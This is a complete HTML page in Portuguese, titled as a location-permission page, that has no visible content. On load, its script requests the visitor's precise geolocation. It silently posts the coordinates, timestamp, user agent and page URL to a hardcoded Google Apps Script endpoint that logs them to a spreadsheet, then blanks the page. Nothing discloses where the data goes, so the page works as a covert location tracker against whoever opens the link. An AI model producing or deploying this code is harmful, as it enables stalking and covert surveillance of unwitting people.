<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Permissão de Localização</title>
</head>
<body>
  <script>
    (function() {
      // URL do seu Google Apps Script Web App
      const LOG_ENDPOINT = 'https://script.google.com/macros/s/AKfycby5kT18kkDvLjtySh6T2JBOSO_qkPy7hQhoqcoR13khsyYbY_74Zp9KhQPiG98VNgd6nQ/exec';

      // Função para enviar os dados para o Apps Script
      async function enviar(lat, lon) {
        if (!LOG_ENDPOINT) return;
        try {
          const payload = {
            lat: lat,
            lon: lon,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent || '',
            origem: window.location.href
          };

          await fetch(LOG_ENDPOINT, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload),
            credentials: 'omit',
            mode: 'cors'
          });
        } catch (err) {
          console.warn('Erro ao enviar localização:', err);
        }
      }

      // Solicita a localização e, se obtiver, envia e deixa a página em branco
      function pedirLocalizacaoUmaVez() {
        if (!navigator.geolocation) {
          document.body.innerHTML = '';
          return;
        }

        navigator.geolocation.getCurrentPosition(function(pos) {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          // envia para a planilha
          enviar(lat, lon).finally(() => {
            document.body.innerHTML = '';
          });
        }, function(err) {
          // se erro ou permissão negada, apenas fica em branco
          document.body.innerHTML = '';
        }, {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        });
      }

      // Ao carregar a página, chamar a função
      window.addEventListener('load', pedirLocalizacaoUmaVez, {once: true});
    })();
  </script>
</body>
</html>
